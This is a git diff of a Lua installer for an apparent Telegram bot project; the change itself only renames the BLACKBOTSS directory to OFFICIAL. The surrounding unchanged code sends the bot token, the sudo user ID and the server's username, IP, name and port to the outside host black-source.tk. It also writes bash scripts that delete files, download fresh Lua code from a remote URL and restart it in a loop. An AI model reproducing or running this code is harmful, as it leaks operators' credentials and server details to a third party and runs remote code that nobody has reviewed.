@@ -68,10 +68,10 @@ local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 print("::Black::")
-local RunBot = io.open("BLACKBOTSS", 'w')
+local RunBot = io.open("OFFICIAL", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/BLACKBOTSS
+cd $HOME/OFFICIAL
 token="]]..database:get(Server_Done.."Token_Write")..[["
 rm -fr BLACKBOTSS.lua
 wget "https://raw.githubusercontent.com/blackedSaqr/OFFICIAL/main/BLACKBOTSS.lua"
@@ -84,11 +84,11 @@ RunBot:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/BLACKBOTSS
+cd $HOME/OFFICIAL
 while(true) do
 rm -fr ../.telegram-cli
 screen -S BLACKBOTSS -X kill
-screen -S BLACKBOTSS ./BLACKBOTSS
+screen -S BLACKBOTSS ./OFFICIAL
 done
 ]])
 RunTs:close()
